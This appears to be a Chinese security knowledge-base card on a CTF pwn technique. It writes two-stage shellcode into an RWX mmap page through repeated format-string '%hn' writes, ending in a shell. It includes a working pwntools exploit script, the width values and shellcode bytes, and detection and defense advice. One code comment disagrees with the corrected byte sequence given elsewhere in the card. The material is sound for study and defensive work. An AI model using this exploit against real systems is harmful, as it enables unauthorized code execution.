---
id: binary-pwn-format-string-hn-rwx-mmap-shellcode-staging
title: 格式化字符串 %hn 向 RWX mmap 逐 2 字节写 shellcode：短跳回读 syscall 续写二阶段
type: scenario
domain: binary
path: binary/pwn/format-string
technique: format-string-hn-rwx-mmap-shellcode-staging
tags:
- pwn
- format-string
- shellcode
- mmap
- rwx
- hn
- staged-payload
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V242
  verified_at: '2026-11-07T12:51:00+08:00'
  notes: 已对照原文 shellcode_printer 段核对：mmap RWX、*addr=0xC3、fprintf 格式串、addr 每轮+2、7 个宽度值与两阶段 read/jmp 均一致；修正第一阶段 shellcode 字节串漏写的 0x90 nop（宽度 0x90DA 的高字节），实为 14 字节 48 31 ff 48 89 d6 4c 89 da 90 0f 05 eb f2；未在本机复跑（原文脚本有约 1/8 爆破概率）。
url: /docs/binary/pwn/format-string/binary-pwn-format-string-hn-rwx-mmap-shellcode-staging/
draft: false
kb_aliases:
- shellcode_printer
- '%hn 写 shellcode'
- 格式化字符串写 RWX 页
- 2 字节 shellcode 拼接
- jmp short 回跳
- 分阶段 shellcode
---

## 一句话结论

当程序把用户输入直接作为 `fprintf(stream, fmt)` 的格式串（`stream` 是 `/dev/null`），并最终跳转到一块可读写可执行的 `mmap` 区域时，攻击者可以用 `%<n>c%6$hn` 每次向当前 `addr` 写入 2 字节，把一段“read 系统调用 + 短跳回跳”的 shellcode 逐 2 字节拼进 RWX 页；程序返回后执行该 stub，从标准输入读入完整二阶段 shellcode 并跳转执行，从而绕过 NX/输入长度限制拿到 shell。原文 exp 因地址/布局存在约 1/8 的爆破概率。

## 原理

- **格式化字符串写原语**：`fprintf(stream, s)` 把用户输入 `s` 当格式串。`%<n>c` 先输出 n 个字符，`%6$hn` 把“已输出字符数”的低 16 位写到第 6 个可变参数指向的地址；调试确认该参数槽正好是循环变量 `addr`（要写入的目标地址），因此每轮可写 2 字节。
- **目标页可执行**：程序先 `mmap(0, pagesize, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)`，把返回地址存入 `addr`；随后在 `addr` 处写入 `0xC3`（`ret`），进入循环。最终 `return ((void (*)(void))addr)()` 跳到该页执行，页权限为 RWX。
- **循环让地址每轮 +2**：`for (addr -= 2; ; addr += 2)` 每处理一条格式串就把 `addr` 前移 2 字节；攻击者每轮输入一条 `%<value>c%6$hn`，就向连续的 2 字节槽写入下一段 shellcode。`fprintf` 的输出写到 `/dev/null`，不会干扰交互。
- **两阶段 shellcode**：第一阶段的 7 个 2 字节值（宽度 12616/18687/54921/35148/37082/1295/62187）拼成 14 字节 `48 31 ff 48 89 d6 4c 89 da 90 0f 05 eb f2`，即 `xor rdi,rdi; mov rsi,rdx; mov rdx,r11; nop; syscall; jmp short -14`（`0x90` 来自宽度 0x90DA 的高字节）。该 stub 利用调用时寄存器里已有的值完成 `read(0, buf, len)`（原文说明执行到 read 时 `rsi` 恰好指向 syscall 的下一个地址，可续写），读入二阶段 shellcode 后 `jmp` 回到 stub 起始处继续执行；二阶段可用 pwntools `shellcraft.sh()`。
- **为什么不是普通 `%n` 改 GOT**：本例 Full RELRO + PIE，GOT 不可写；程序只给了格式化字符串写原语和一个 RWX 页，因此把写原语直接用于“写代码”而不是写控制流指针，是把格式化字符串转成任意代码执行的一条路径。
- **1/8 概率**：原文称脚本存在约八分之一的爆破概率，与地址/寄存器/布局的随机性有关；失败后重试。

## 触发条件

- 程序存在 `fprintf`/`printf`/`snprintf` 等把用户输入当格式串的调用，且格式串长度足以容纳 `%<n>c%6$hn`（本例 `fgets(s,16)`）。
- 程序提供可写且可执行的 `mmap` 页，并在某个时刻跳转到该页执行（本例最终 `return addr()`）。
- 目标参数的索引（本例第 6 个）在调试中可确定；不同编译器/优化级别会改变可变参数槽位。
- 程序未开启会拦截 RWX 页或 `read`/`execve` 的安全机制（如 SELinux W^X、seccomp 限制）；程序运行时有可用的 stdin 继续接收二阶段。
- 输入循环允许连续多轮输入（本例空行结束），且每轮 `addr` 的递增步长可控（本例 2 字节）。

## 利用步骤

1. 逆向确认 `mmap` 的保护为 7（RWX）、最终调用 `addr`，以及 `fprintf(stream, s)` 使用用户输入作格式串。
2. 调确定位 `addr` 在 `fprintf` 可变参数中的位置（本例 `%6$hn`）。
3. 按小端把第一阶段 shellcode 切成 2 字节片段，计算每段对应的十进制输出宽度（例如 `0x3148` → `%12616c`），每轮发送 `%<width>c%6$hn`。
4. 最后一段写 `EB F2`（`jmp short -14`）回跳到 stub 起始；再发送空行结束循环，让程序执行 RWX 页。
5. stub 执行 `read(0, ...)` 时发送二阶段 shellcode（如 `asm(shellcraft.sh())`），stub 跳回后执行二阶段，拿 shell。
6. 若未成功，按原文的约 1/8 概率重试（地址/布局随机）。

## PoC

```c
// 关键逻辑（逆向还原）
len = getpagesize();
addr = mmap(0, len, 7, 34, -1, 0);   // RWX
*addr = 0xC3;                        // ret
for (addr -= 2; ; addr += 2) {
    fgets(s, 16, stdin);
    s[strcspn(s, "\n")] = 0;
    if (!s[0]) break;
    fprintf(stream, s);              // stream = fopen("/dev/null","w")
}
return ((void (*)(void))addr)();
```

```python
from pwn import *
context.arch = 'amd64'

p = process('./pwn')
# 每 2 字节一段写 shellcode：48 31 ff 48 89 d6 4c 89 da 0f 05 eb f2
for w in [12616, 18687, 54921, 35148, 37082, 1295, 62187]:
    p.sendlineafter(b": ", f"%{w}c%6$hn".encode())
p.sendlineafter(b": ", b"\x00")          # 空行结束循环

p.send(asm(shellcraft.sh()))             # 二阶段 shellcode，由 read stub 读入
p.interactive()
```

原文 exp 使用同样的 7 个宽度值（12616/18687/54921/35148/37082/1295/62187），并把 `jmp short` 作为最后 2 字节；本卡未复跑。

## 变体与关联

- **参数索引变体**：`%6$hn` 依赖编译器把 `addr` 放在第 6 个可变参数槽；换环境需重新用 `%p` 定位。部分目标可用 `%hn` 直接写栈上的地址槽，再用 `%n` 写 GOT。
- **不是同一手法**：`[[binary-pwn-format-string-got-hijack]]`、`[[binary-pwn-format-string-one-shot-stack-return-address-two-n-writes]]`、`[[binary-pwn-format-string-limited-nonstack-loop-condition-byte-rop]]` 都是把 `%n` 用于写 GOT/返回地址/ROP 链；本卡把写原语用于**写可执行的 shellcode 字节**，利用面不同。
- **与 ret2shellcode 的区别**：`[[binary-pwn-stack-ret2shellcode-mprotect-bss-rwx-page]]` 需要程序自己 `mprotect` 出 RWX 页并有栈溢出写 shellcode；本卡只有格式化字符串写，靠 `%hn` 逐 2 字节拼接。
- **关联**：`[[binary-pwn-format-string-draytek-user-login-cgi-cve-2023-31447]]` 的 CVE 描述也提到格式化字符串可修改代码段/写入 shellcode，但该文只给出 `%p%n` 最小 PoC，未展示拼接过程。

## 检测与防御

- **代码修复**：所有用户输入只能作为 `%s` 的实参，禁止进入 format 参数（`fprintf(f, "%s", s)`）；编译期启用 `-Wformat-security -Werror=format-security`。
- **编译/运行时缓解**：不要把 `mmap` 映射成 RWX（`PROT_READ|PROT_WRITE` 后再按需 `mprotect(PROT_EXEC)`，或启用 W^X）；启用 NX、ASLR、Full RELRO/PIE。
- **检测**：请求/输入中出现大量 `%<数字>c%<idx>$hn` 模式、连续的 2 字节格式化写入；进程在 RWX 页执行（EDR/内核审计 `mmap` RWX + 执行）；空行后紧跟 shellcode 字节流。
- **防御**：对格式化字符串输入做长度与字符白名单；限制可执行匿名映射；对二进制开启 CFI/影子栈等。
